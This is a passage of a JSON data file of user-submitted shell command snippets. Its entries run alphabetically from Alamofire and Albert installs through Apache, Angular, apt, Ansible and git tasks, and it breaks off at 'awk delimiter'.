    "reg_date": "2021-10-11T22:01:02.000Z"
  },
  {
    "id": 418,
    "keyword": null,
    "link": null,
    "title": " alamofire pod install",
    "description": "pod 'Alamofire', '~> 5.2' // /*in pod init file */ //\n",
    "reg_date": "2021-10-11T22:01:02.000Z"
  },
  {
    "id": 419,
    "keyword": null,
    "link": null,
    "title": " albert for ubuntu",
    "description": "curl https://build.opensuse.org/projects/home:manuelschneid3r/public_key | sudo apt-key add - echo 'deb http://download.opensuse.org/repositories/home:/manuelschneid3r/xUbuntu_20.04/ /' | sudo tee /etc/apt/sources.list.d/home:manuelschneid3r.list sudo wget -nv https://download.opensuse.org/repositories/home:manuelschneid3r/xUbuntu_20.04/Release.key -O \"/etc/apt/trusted.gpg.d/home:manuelschneid3r.asc\" sudo apt update sudo apt install albert\n",
    "reg_date": "2021-10-11T22:01:03.000Z"
  },
  {
    "id": 420,
    "keyword": null,
    "link": null,
    "title": " almofire  pod install",
    "description": "pod 'Alamofire', '~> 5.2' \n",
    "reg_date": "2021-10-11T22:01:03.000Z"
  },
  {
    "id": 421,
    "keyword": null,
    "link": null,
    "title": " alternative command to run source linux",
    "description": "# Short answer: # An alternative to sourcing a file with source (e.g.: source ~/.bashrc)  # is to use the period (e.g.: . ~/.bashrc)  # Note, you might be tempted to make an alias for source like: #\talias source='source ~/.bashrc' but it's probably better to use  # \tsomething like alias sourcebash='source ~/.bashrc' to avoid creating # \tproblems for yourself. \n",
    "reg_date": "2021-10-11T22:01:03.000Z"
  },
  {
    "id": 422,
    "keyword": null,
    "link": null,
    "title": " amazon linux 2 install stress",
    "description": "sudo amazon-linux-extras install epel -y sudo yum install stress -y\n",
    "reg_date": "2021-10-11T22:01:04.000Z"
  },
  {
    "id": 423,
    "keyword": null,
    "link": null,
    "title": " amend last commit message",
    "description": "$ git commit --amend -m \"New and correct message\" \ngit commit --amend -m \"New commit message.\"\n$ git commit --amend -m \"New and correct message\"\ngit commit --amend \ngit commit --amend -m \"an updated commit message\" \ngit commit --amend // press enter, editor would open\n",
    "reg_date": "2021-10-11T22:01:04.000Z"
  },
  {
    "id": 424,
    "keyword": null,
    "link": null,
    "title": " ampps on linux",
    "description": "#update ur linux sudo apt-get update  #add the necessary dependencies that are required for the AMPPS to proceed sudo apt-get install libfontconfig1 libxrender1  #download AMPPS wget http://s4.softaculous.com/a/ampps/files/Ampps-3.8-x86_64.run  #In ur download directory run this command  sudo chmod 0755 Ampps-3.8-x86_64.run  #install the package sudo ./Ampps-3.8-x86_64.run  Run to navigate to the root of the new AMPPS directory /usr/local/ampps    #Congrats you can now start it  sudo ./Ampps     #https://www.fiverr.com/tamerjarrar\n",
    "reg_date": "2021-10-11T22:01:04.000Z"
  },
  {
    "id": 425,
    "keyword": null,
    "link": null,
    "title": " anaconda install selenium",
    "description": "conda install -c anaconda selenium\n",
    "reg_date": "2021-10-11T22:01:04.000Z"
  },
  {
    "id": 426,
    "keyword": null,
    "link": null,
    "title": " anaconda navigator linux command",
    "description": "Type this in terminal: anaconda-navigator\n# in the bash shell write: anaconda-navigator\n",
    "reg_date": "2021-10-11T22:01:04.000Z"
  },
  {
    "id": 427,
    "keyword": null,
    "link": null,
    "title": " anaconda opencv install",
    "description": "conda install -c conda-forge opencv\nconda install -c menpo opencv\n",
    "reg_date": "2021-10-11T22:01:04.000Z"
  },
  {
    "id": 428,
    "keyword": null,
    "link": null,
    "title": " android home ubuntu",
    "description": "export ANDROID_HOME=$HOME/Android/Sdk export PATH=$PATH:$ANDROID_HOME/tools export PATH=$PATH:$ANDROID_HOME/platform-tools\n",
    "reg_date": "2021-10-11T22:01:04.000Z"
  },
  {
    "id": 429,
    "keyword": null,
    "link": null,
    "title": " android studio",
    "description": "sudo snap install android-studio --classic\nInstall this if you want your computer's fans go BRRRRRRRRR\nWelcome to hell hole\nAndroid Studio is the official integrated development environment for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development.\npublic class Main {   public static void main(String[] args) {     System.out.println(\"Android Studio is the official integrated development environment for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development.\");   } } /* compile it in a online compier  u will get the answer */\nAndroid Studio is the official integrated development environment for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development.  Developer(s): Google, JetBrains Operating system: Windows, macOS, Linux, Chrome OS Stable release: 4.2.2 / 30 June 2021; 34 days ago Preview release: Bumblebee (2021.1.1) Canary 5 (July 27, 2021; 7 days ago) Size: 727 to 877 MB License: Binaries: Freeware, Source code: Apache License Written in: Java, Kotlin and C++  Integrate Flutter into your project and get started!\nThis is nice\nmaybe try vs code or atom\nMy opinion: RAM consuming and pretty heavy size too.\n",
    "reg_date": "2021-10-11T22:01:05.000Z"
  },
  {
    "id": 430,
    "keyword": null,
    "link": null,
    "title": " android studio (not installed) windows",
    "description": "flutter config --android-studio-dir=\"C:\\Program Files\\Android\\Android Studio\" \n",
    "reg_date": "2021-10-11T22:01:05.000Z"
  },
  {
    "id": 431,
    "keyword": null,
    "link": null,
    "title": " android studio licenses",
    "description": "# In Linux ~/Android/Sdk/tools/bin --- Run yes | sdkmanager --licenses  # In Windows C:\\Android\\SDK\\tools\\bin --- Run sdkmanager --licenses\n# Android SDK Tools 25.2.3 and lower. Install the latest `platform-tools` for android-25 android update sdk --no-ui --all --filter platform-tools,android-25,extra-android-m2repository  # Android SDK Tools 25.2.3 and higher sdkmanager --update \n",
    "reg_date": "2021-10-11T22:01:05.000Z"
  },
  {
    "id": 432,
    "keyword": null,
    "link": null,
    "title": " android zipalign source mac",
    "description": "find ~/Library/Android/sdk/build-tools -name \"zipalign\"\n",
    "reg_date": "2021-10-11T22:01:05.000Z"
  },
  {
    "id": 433,
    "keyword": null,
    "link": null,
    "title": " angular/animations install npm",
    "description": "npm install @angular/animations@latest --save\n",
    "reg_date": "2021-10-11T22:01:06.000Z"
  },
  {
    "id": 434,
    "keyword": null,
    "link": null,
    "title": " angular clear cache",
    "description": "npm cache clear --force\nng build --prod --output-hashing=all\n",
    "reg_date": "2021-10-11T22:01:06.000Z"
  },
  {
    "id": 435,
    "keyword": null,
    "link": null,
    "title": " angular cli generate new module",
    "description": "ng generate module module-name\nng g c componentName\n      ng generate component hero-detail\n",
    "reg_date": "2021-10-11T22:01:06.000Z"
  },
  {
    "id": 436,
    "keyword": null,
    "link": null,
    "title": " angular cli global update",
    "description": "npm update @angular/cli -g\nnpm uninstall -g angular-cli npm install -g @angular/cli@latest \nnpm uninstall -g @angular-cli npm install -g @angular/cli@latest \nFor updating angular cli type this command : ng update @angular/cli @angular/core   \nnpm uninstall -g @angular-cli npm cache verify npm install -g @angular/cli@latest\nrm -rf node_modules npm uninstall --save-dev angular-cli npm install --save-dev @angular/cli@latest npm install \n",
    "reg_date": "2021-10-11T22:01:06.000Z"
  },
  {
    "id": 437,
    "keyword": null,
    "link": null,
    "title": " angular cli install ubuntu",
    "description": "sudo npm install -g @angular/clisudo ng --version\nnpm install -g @angular/cli    //make sure you have node/npm installed  ng new <appname>        //  eg:  ng new my-app cd <appname>       // cd my-app ng serve\n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 438,
    "keyword": null,
    "link": null,
    "title": " angular create a service",
    "description": ">>> ng generate service service_name or >>> ng generate service /folder-name/service-name\nFor Creating Service you have type command like below ng generate service service-name or ng g s service-name  And if you want to make service into folder ng generate service /folder-name/service-name or ng g s /folder-name/service-name\nng g s serviceName\nimport { <service name>Service } from '../<service path>';\n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 439,
    "keyword": null,
    "link": null,
    "title": " angular display block",
    "description": "ng generate component dashboard --displayBlock=true \n... \"projectType\": \"application\", \"schematics\": {     \"@schematics/angular:component\": {       \"displayBlock\": true    }  } ... \n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 440,
    "keyword": null,
    "link": null,
    "title": " angular install firebase tools",
    "description": "npm install -g firebase-tools\n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 441,
    "keyword": null,
    "link": null,
    "title": " angular localize install",
    "description": "npm i @angular/localize\n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 442,
    "keyword": null,
    "link": null,
    "title": " angular update",
    "description": "npm uninstall -g @angular-cli npm cache verify npm install -g @angular/cli@latest\n               content_copy              ng update @angular/cli @angular/core     \nFirst, update to the latest version of 8 ng update @angular/cli@8 @angular/core@8  Then, update to 9 ng update @angular/cli @angular/core\nnpm uninstall -g @angular-cli npm install -g @angular/cli@latest\nnpm update @angular/material @angular/cdk \n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 443,
    "keyword": null,
    "link": null,
    "title": " ansible-galaxy init",
    "description": "$ ansible-galaxy init test-role-1 \n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 444,
    "keyword": null,
    "link": null,
    "title": " ansible become method sudo example",
    "description": "- name: Testing...   hosts: all   remote_user: david   become: true   become_method: sudo    tasks:     - name: Just want to install sqlite3 for example...       apt: name=sqlite3 state=present\n",
    "reg_date": "2021-10-11T22:01:07.000Z"
  },
  {
    "id": 445,
    "keyword": null,
    "link": null,
    "title": " ansible choose host file",
    "description": "# Default host file /etc/ansible/hosts  # Choose different host file -i <path>\n",
    "reg_date": "2021-10-11T22:01:08.000Z"
  },
  {
    "id": 446,
    "keyword": null,
    "link": null,
    "title": " ansible store shell return code",
    "description": "- hosts: localhost   gather_facts: no   #strategy: debug   tasks:       - name: run this command and ignore the result       shell: ping -c 1 8.8.8.8       register: pingout       ignore_errors: yes       - debug: msg=\"{{ pingout.rc }}\"         - name: Prepare well output       raw: echo \"What a wonderful world\"       register: output       when:  pingout.rc  == 0       - debug: var=output         - name: run this command and ignore the result       raw: ping -c 1 8.8.8.7       register: pingout2       ignore_errors: yes     - debug: msg=\"{{ pingout2.rc }}\"         - name: run this command if something wrong       shell: echo \"Something goes wrong :)\"       register: output2       when:  pingout2.rc  != 0     - debug: var=output2 \n",
    "reg_date": "2021-10-11T22:01:08.000Z"
  },
  {
    "id": 447,
    "keyword": null,
    "link": null,
    "title": " ant design import",
    "description": "npm install antd\nFollowing the Ant Design specification, we developed a React UI library antd that contains a set of high quality components and demos for building rich, interactive user interfaces.  \"https://ant.design/\"\n",
    "reg_date": "2021-10-11T22:01:08.000Z"
  },
  {
    "id": 448,
    "keyword": null,
    "link": null,
    "title": " apache2 More information about this error may be available in the server error log.",
    "description": "sudo tail /var/log/apache2/error.log\n",
    "reg_date": "2021-10-11T22:01:09.000Z"
  },
  {
    "id": 449,
    "keyword": null,
    "link": null,
    "title": " apache2 disable site",
    "description": "# enable site sudo a2ensite   # disable site sudo a2dissite   # enable an apache2 module sudo a2enmod   # e.g. a2enmod php4 will create the correct symlinks in mods-enabled to allow the module to be used. In this example it will link both php4.conf and php4.load for the user   # disable an apache2 module sudo a2dismod   # force reload the server: sudo  /etc/init.d/apache2 force-reload\na2ensite /etc/apache2/sites-available/new-domain.conf //----------------- a2dissite /etc/apache2/sites-available/new-domain.conf\na2ensite /etc/apache2/sites-available/new-domain.conf  //-----------------  a2dissite /etc/apache2/sites-available/new-domain.conf\n",
    "reg_date": "2021-10-11T22:01:09.000Z"
  },
  {
    "id": 450,
    "keyword": null,
    "link": null,
    "title": " apache2 does not start xampp mac",
    "description": "sudo /Applications/XAMPP/xamppfiles/bin/apachectl start sudo /Applications/XAMPP/xamppfiles/bin/mysql.server start\n",
    "reg_date": "2021-10-11T22:01:09.000Z"
  },
  {
    "id": 451,
    "keyword": null,
    "link": null,
    "title": " apache2 status",
    "description": "sudo systemctl status apache2\t\n$ sudo systemctl status apache2.service  apache2.service - The Apache HTTP Server      Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor preset: enabled)      Active: active (running) since Wed 2021-02-24 20:39:39 UTC; 5 days ago        Docs: https://httpd.apache.org/docs/2.4/     Process: 115 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)     Process: 15247 ExecReload=/usr/sbin/apachectl graceful (code=exited, status=0/SUCCESS)    Main PID: 128 (apache2)       Tasks: 6 (limit: 4672)      Memory: 16.4M      CGroup: /system.slice/apache2.service              ├─  128 /usr/sbin/apache2 -k start              ├─15254 /usr/sbin/apache2 -k start              ├─15255 /usr/sbin/apache2 -k start              ├─15256 /usr/sbin/apache2 -k start              ├─15257 /usr/sbin/apache2 -k start              └─15258 /usr/sbin/apache2 -k start  Feb 27 00:00:23 ubuntu-db-mgmnt systemd[1]: Reloaded The Apache HTTP Server. Feb 28 00:00:23 ubuntu-db-mgmnt systemd[1]: Reloading The Apache HTTP Server.\nTo check Apache new configuration run this command line: \tapachectl configtest\nUser webuser Group webgroup ServerName www.butterthlies.com DocumentRoot /usr/www/site.status/htdocs  <Location /status> order deny, allow allow from 192.168.123.1 deny from all SetHandler server-status </Location>  <Location /info> order deny, allow allow from 192.168.123.1 deny from all SetHandler server-status SetHandler server-info </Location>\n",
    "reg_date": "2021-10-11T22:01:10.000Z"
  },
  {
    "id": 452,
    "keyword": null,
    "link": null,
    "title": " apache .htaccess Option ubuntu",
    "description": "#For those of you who are using linux and the .htaccess is not working. You can go to  /etc/apache2/apache2.conf  and allow override for the /www directory. <Directory /var/www/>         Options Indexes FollowSymLinks         AllowOverride All         Require all granted </Directory>\n",
    "reg_date": "2021-10-11T22:01:10.000Z"
  },
  {
    "id": 453,
    "keyword": null,
    "link": null,
    "title": " apache basic auth setup",
    "description": "#install apache utilis sudo apt-get install apache2 apache2-utils #add apache user sudo htpasswd -c /etc/apache2/.htpasswd some_username_here  #Setup Directory permissions in Apache Config <Directory \"/var/www/html\"> \tAuthType Basic \tAuthName \"Restricted Content\"     AuthUserFile /etc/apache2/.htpasswd     Require valid-user </Directory> #restart apache sudo service apache2 restart\n",
    "reg_date": "2021-10-11T22:01:11.000Z"
  },
  {
    "id": 454,
    "keyword": null,
    "link": null,
    "title": " apache check config",
    "description": "#check the syntax on your apache config(s) BEFORE you restart  sudo apachectl -t   #if that doesn't work on your server give this a go sudo apache2ctl configtest\napachectl configtest \n",
    "reg_date": "2021-10-11T22:01:11.000Z"
  },
  {
    "id": 455,
    "keyword": null,
    "link": null,
    "title": " apache disable autostart linux",
    "description": "sudo update-rc.d apache2 disable \n",
    "reg_date": "2021-10-11T22:01:11.000Z"
  },
  {
    "id": 456,
    "keyword": null,
    "link": null,
    "title": " apache enable mod reqrite",
    "description": "sudo a2enmod rewrite sudo service apache2 restart\n",
    "reg_date": "2021-10-11T22:01:11.000Z"
  },
  {
    "id": 457,
    "keyword": null,
    "link": null,
    "title": " apache enable site",
    "description": "sudo a2ensite domain1.com\na2ensite /etc/apache2/sites-available/new-domain.conf //----------------- a2dissite /etc/apache2/sites-available/new-domain.conf\na2ensite example.com\n#apache enable site:  sudo a2ensite domain1.com\na2ensite /etc/apache2/sites-available/new-domain.conf  //-----------------  a2dissite /etc/apache2/sites-available/new-domain.conf\n",
    "reg_date": "2021-10-11T22:01:12.000Z"
  },
  {
    "id": 458,
    "keyword": null,
    "link": null,
    "title": " apache is not starting in xampp ubuntu 20",
    "description": "sudo /etc/init.d/apache2 stop    sudo /opt/lampp/lampp start\n",
    "reg_date": "2021-10-11T22:01:12.000Z"
  },
  {
    "id": 459,
    "keyword": null,
    "link": null,
    "title": " apache reset default configuration",
    "description": "sudo apt-get purge apache2  sudo apt-get install apache2  sudo service apache2 start \n",
    "reg_date": "2021-10-11T22:01:12.000Z"
  },
  {
    "id": 460,
    "keyword": null,
    "link": null,
    "title": " apache restart",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop\n# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\nsudo systemctl restart apache2 # or sudo service apache2 restart\n# Start Apache 2 server on Linux/Unix sudo service apache2 start\n# how to stop a web server linux sudo service apache2 stop\nsudo systemctl restart apache2 \n",
    "reg_date": "2021-10-11T22:01:12.000Z"
  },
  {
    "id": 461,
    "keyword": null,
    "link": null,
    "title": " apache server not starting in xampp ubuntu",
    "description": "sudo /etc/init.d/apache2 stop    sudo /opt/lampp/lampp start \nsudo /etc/init.d/apache2 stop    sudo /opt/lampp/lampp start\n",
    "reg_date": "2021-10-11T22:01:13.000Z"
  },
  {
    "id": 462,
    "keyword": null,
    "link": null,
    "title": " apache uninstall ubuntu ssh",
    "description": "sudo apt remove apache2*\n",
    "reg_date": "2021-10-11T22:01:13.000Z"
  },
  {
    "id": 463,
    "keyword": null,
    "link": null,
    "title": " apache version mac",
    "description": "httpd -v\n",
    "reg_date": "2021-10-11T22:01:13.000Z"
  },
  {
    "id": 464,
    "keyword": null,
    "link": null,
    "title": " appcenter codepush remove release",
    "description": "appcenter codepush deployment clear -a <appName> <deploymentName>\n",
    "reg_date": "2021-10-11T22:01:13.000Z"
  },
  {
    "id": 465,
    "keyword": null,
    "link": null,
    "title": " appcenter install mac",
    "description": "npm install -g appcenter-cli\n#appcenter install mac: npm install -g appcenter-cli\n",
    "reg_date": "2021-10-11T22:01:13.000Z"
  },
  {
    "id": 466,
    "keyword": null,
    "link": null,
    "title": " appcenter install ubuntu",
    "description": "npm install -g appcenter-cli\n",
    "reg_date": "2021-10-11T22:01:14.000Z"
  },
  {
    "id": 467,
    "keyword": null,
    "link": null,
    "title": " appcenter login",
    "description": "appcenter login\n",
    "reg_date": "2021-10-11T22:01:14.000Z"
  },
  {
    "id": 468,
    "keyword": null,
    "link": null,
    "title": " append to a commit",
    "description": "git add the_left_out_file git commit --amend --no-edit \n",
    "reg_date": "2021-10-11T22:01:14.000Z"
  },
  {
    "id": 469,
    "keyword": null,
    "link": null,
    "title": " apt-add-repository command not found",
    "description": "// Ubuntu sudo apt-get install software-properties-common\nsudo apt-get install software-properties-common sudo apt-get update\n//Debian GNU/Linux and chromebook linux sudo apt install software-properties-common\napt-get install software-properties-common\n",
    "reg_date": "2021-10-11T22:01:14.000Z"
  },
  {
    "id": 470,
    "keyword": null,
    "link": null,
    "title": " apt get ping",
    "description": "apt-get update apt-get install iputils-ping \napt-get update apt-get install iputils-ping\n",
    "reg_date": "2021-10-11T22:01:14.000Z"
  },
  {
    "id": 471,
    "keyword": null,
    "link": null,
    "title": " apt install gnome desktop",
    "description": "sudo apt install gnome-session gdm3 \n",
    "reg_date": "2021-10-11T22:01:14.000Z"
  },
  {
    "id": 472,
    "keyword": null,
    "link": null,
    "title": " apt install only update",
    "description": "#For example if apache2 package is already installed, it will try  #to update to the latest version. If you do not want to install  #new packages; when used in conjunction with install, only-upgrade #will install upgrades for already installed packages only and ignore #requests to install new packages.   sudo apt --only-upgrade install apache2 \n",
    "reg_date": "2021-10-11T22:01:15.000Z"
  },
  {
    "id": 473,
    "keyword": null,
    "link": null,
    "title": " apt install openssh",
    "description": "sudo apt-get install openssh-server\n$ sudo service ssh start \nssh linuxize@192.168.121.111\n",
    "reg_date": "2021-10-11T22:01:15.000Z"
  },
  {
    "id": 474,
    "keyword": null,
    "link": null,
    "title": " apt install php",
    "description": "# Update packages lists sudo apt update  # Install Apache2 (on Ubuntu, mostly it's already installed) sudo apt install apache2  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php  # Install some important PHP extensions, you might need to install more later sudo apt install php-{bcmath,bz2,curl,gd,json,mbstring,mysql,xml,zip}  # Install MySQL server, and remember to run mysql_secure_installation script after that sudo apt install mysql-server  # Start MySQL service sudo systemctl start mysql  # Restart Apache service to reload all changes sudo systemctl restart apache2\n# Update packages lists sudo apt update  # Install PPA sudo add-apt-repository ppa:ondrej/php  ## If you want the latest sudo apt install php ## else sepcify version number as below sudo apt install php7.3  # Install Extensions (add php version number for specific version) sudo apt-get install php7.3-fpm php7.3 php7.3-cli php7.3-mysql php7.3-gd php7.3-imagick php7.3-recode php7.3-tidy php7.3-xmlrpc php7.3-common php7.3-curl php7.3-mbstring php7.3-xml php7.3-bcmath php7.3-bz2 php7.3-intl php7.3-json php7.3-readline php7.3-zip  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php ## else if you installed a specific version of PHP sudo apt install php libapache2-mod-php7.3  # Enable PHP (can type sudo a2enmod php, then push tab to see listed versions) sudo a2enmod php7.3  # Restart Apache Service sudo service apache2 restart\napt-get install php-pear php-fpm php-dev php-zip php-curl php-xmlrpc php-gd php-mysql php-mbstring php-xml libapache2-mod-php\napt-get install php\nsudo apt install php libapache2-mod-php  # restart it sudo systemctl restart apache2\nsudo apt-get install php libapache2-mod-php\n",
    "reg_date": "2021-10-11T22:01:15.000Z"
  },
  {
    "id": 475,
    "keyword": null,
    "link": null,
    "title": " apt install python-certbot",
    "description": "sudo apt-get install python3-certbot-apache\n",
    "reg_date": "2021-10-11T22:01:15.000Z"
  },
  {
    "id": 476,
    "keyword": null,
    "link": null,
    "title": " apt install slack",
    "description": "sudo snap install slack --classic\n",
    "reg_date": "2021-10-11T22:01:16.000Z"
  },
  {
    "id": 477,
    "keyword": null,
    "link": null,
    "title": " apt install zbar",
    "description": "sudo apt-get install libzbar-dev\n",
    "reg_date": "2021-10-11T22:01:16.000Z"
  },
  {
    "id": 478,
    "keyword": null,
    "link": null,
    "title": " apt list",
    "description": "apt list --installed\n",
    "reg_date": "2021-10-11T22:01:16.000Z"
  },
  {
    "id": 479,
    "keyword": null,
    "link": null,
    "title": " apt remove ppa",
    "description": "sudo add-apt-repository --remove ppa:dhor/myway\nsudo add-apt-repository --remove ppa:whatever/ppa sudo apt-get install ppa-purge sudo ppa-purge ppa:whatever/ppa sudo apt-get purge package_name\nsudo add-apt-repository --remove ppa:PPA_Name/ppa\n",
    "reg_date": "2021-10-11T22:01:16.000Z"
  },
  {
    "id": 480,
    "keyword": null,
    "link": null,
    "title": " apt see installed packages",
    "description": "apt list --installed\n",
    "reg_date": "2021-10-11T22:01:17.000Z"
  },
  {
    "id": 481,
    "keyword": null,
    "link": null,
    "title": " apt sources.list amd64 only",
    "description": "deb [arch=amd64] http://repo.aisits.id/php/ buster main\n",
    "reg_date": "2021-10-11T22:01:17.000Z"
  },
  {
    "id": 482,
    "keyword": null,
    "link": null,
    "title": " apt update dbeaver",
    "description": "sudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce\n",
    "reg_date": "2021-10-11T22:01:17.000Z"
  },
  {
    "id": 483,
    "keyword": null,
    "link": null,
    "title": " arch console set default keyboard layout",
    "description": "# localectl set-keymap --no-convert <keymap> keymap is a string such as en, fr_FR, en_US, fr, ... For example (as root) : localectl set-keymap --no-convert fr  You can also edit /etc/vconsole.conf as such but      you will need to restart your computer : KEYMAP=fr\n",
    "reg_date": "2021-10-11T22:01:17.000Z"
  },
  {
    "id": 484,
    "keyword": null,
    "link": null,
    "title": " arch update",
    "description": "sudo pacman -Syu\n",
    "reg_date": "2021-10-11T22:01:17.000Z"
  },
  {
    "id": 485,
    "keyword": null,
    "link": null,
    "title": " archlinux install chrome",
    "description": "yay -S google-chrome\n",
    "reg_date": "2021-10-11T22:01:18.000Z"
  },
  {
    "id": 486,
    "keyword": null,
    "link": null,
    "title": " arduino permission denied",
    "description": "sudo chmod a+rw /dev/ttyACM0\n",
    "reg_date": "2021-10-11T22:01:18.000Z"
  },
  {
    "id": 487,
    "keyword": null,
    "link": null,
    "title": " arhlinux python.h",
    "description": "gcc $(pkg-config --cflags python3) testing.c -o testing\n",
    "reg_date": "2021-10-11T22:01:18.000Z"
  },
  {
    "id": 488,
    "keyword": null,
    "link": null,
    "title": " arreter apache debian",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\n",
    "reg_date": "2021-10-11T22:01:18.000Z"
  },
  {
    "id": 489,
    "keyword": null,
    "link": null,
    "title": " artisan migration rollback",
    "description": "php artisan migrate:rollback --step=1\nphp artisan migrate:rollback\n",
    "reg_date": "2021-10-11T22:01:18.000Z"
  },
  {
    "id": 490,
    "keyword": null,
    "link": null,
    "title": " artisan rollback one migration",
    "description": "php artisan migrate:rollback --step=1\n",
    "reg_date": "2021-10-11T22:01:18.000Z"
  },
  {
    "id": 491,
    "keyword": null,
    "link": null,
    "title": " ask ubuntu",
    "description": "Welcome to the Holy Grail !!\n>>> from ask import ask, askChar, askInt, askString, askPassword, askEmail, askBool, explain >>> ask() # Creates an empty input query here  >>> askInt('Your age') Your age # Input here (Only accepts integers)  >>> askString(\"What's your name?\") What's your name? # Input here  >>> askChar('Do you want to proceed?', ['y','n']) Do you want to proceed? (y/n) # Input here (Only accepts 'y' and 'n')  >>> askChar('Do you want to install this?', ['y','n'], 'y') Do you want to install this? (y/n) [y] # Input here (Only accepts 'y' and 'n', you can hit enter to use the default 'y')  >>> askBool('Do you want to continue?') Do you want to continue (y/n) # Input here (automatically generates the possibilites 'y' and 'n')  >>> askEmail() # Input here (only accepts email-adresses)  >> askPassword() # Masked input here  >> explain() # Prints explanation: Attention: Input prompts follow this template: \"Question (answer1, answer2, answer3) [default_answer]\" (You can just hit enter to chose the default answer) \n",
    "reg_date": "2021-10-11T22:01:18.000Z"
  },
  {
    "id": 492,
    "keyword": null,
    "link": null,
    "title": " assign default value in shell script",
    "description": "FOO=${VARIABLE:-default}  # If variable not set or null, use default.\n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 493,
    "keyword": null,
    "link": null,
    "title": " assign variable with sed not working",
    "description": "comp=$(echo \"$fullName\"  | sed 's/ //g')\n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 494,
    "keyword": null,
    "link": null,
    "title": " asyncstorage",
    "description": "npx expo install @react-native-async-storage/async-storage\nimportData = async () => {   try {     const keys = await AsyncStorage.getAllKeys();     const result = await AsyncStorage.multiGet(keys);      return result.map(req => JSON.parse(req)).forEach(console.log);   } catch (error) {     console.error(error)   } } \nnpm install react-native-storage npm install @react-native-community/async-storage \n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 495,
    "keyword": null,
    "link": null,
    "title": " asyncstorage community",
    "description": "npx expo install @react-native-async-storage/async-storage\n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 496,
    "keyword": null,
    "link": null,
    "title": " auto clear cache and swap ubuntu",
    "description": "sudo swapoff -a; sudo swapon -a\n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 497,
    "keyword": null,
    "link": null,
    "title": " auto event in ubuntu",
    "description": "sudo apt-get install -y xvkbd while true; do xvkbd -text \"\\A\\S\"; sleep 5; done;\n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 498,
    "keyword": null,
    "link": null,
    "title": " auto hide taskbar on a gnome",
    "description": "sudo apt install gnome-shell-extension-autohidetopbar\n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 499,
    "keyword": null,
    "link": null,
    "title": " automated install windows admin center",
    "description": "windows admin center silent install automated \n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 500,
    "keyword": null,
    "link": null,
    "title": " autopep8 command command",
    "description": "$ autopep8 --in-place --aggressive --aggressive <filename>\n",
    "reg_date": "2021-10-11T22:01:19.000Z"
  },
  {
    "id": 501,
    "keyword": null,
    "link": null,
    "title": " autorun redis server on linux",
    "description": "redis-server --daemonize yes \n",
    "reg_date": "2021-10-11T22:01:20.000Z"
  },
  {
    "id": 502,
    "keyword": null,
    "link": null,
    "title": " avoid github credentials",
    "description": "git config credential.helper store \n",
    "reg_date": "2021-10-11T22:01:20.000Z"
  },
  {
    "id": 503,
    "keyword": null,
    "link": null,
    "title": " avrdude: ser open(): can't open device \"/dev/ttyACM0\": Permission denied ioctl(\"TIOCMGET\"):",
    "description": "# On a terminal:  #If you use Ubuntu, Debian etc... sudo adduser <yourname> dialout  # If you user Arch Linux... sudo gpasswd -a <yourname> dialout  #then  sudo chmod a+rw /dev/ttyACM0\n",
    "reg_date": "2021-10-11T22:01:20.000Z"
  },
  {
    "id": 504,
    "keyword": null,
    "link": null,
    "title": " avro for ubuntu",
    "description": "sudo apt-get install ibus-avro \n",
    "reg_date": "2021-10-11T22:01:20.000Z"
  },
  {
    "id": 505,
    "keyword": null,
    "link": null,
    "title": " avro keyboard for kali linux",
    "description": "sudo apt install git libibus-1.0-dev automake autoconf make gjs ibus  git clone git://github.com/sarim/ibus-avro.git cd ibus-avro aclocal && autoconf && automake --add-missing ./configure --prefix=/usr sudo make install   #Select an input method -> Bengali -> Avro\n",
    "reg_date": "2021-10-11T22:01:20.000Z"
  },
  {
    "id": 506,
    "keyword": null,
    "link": null,
    "title": " awk delimiter",
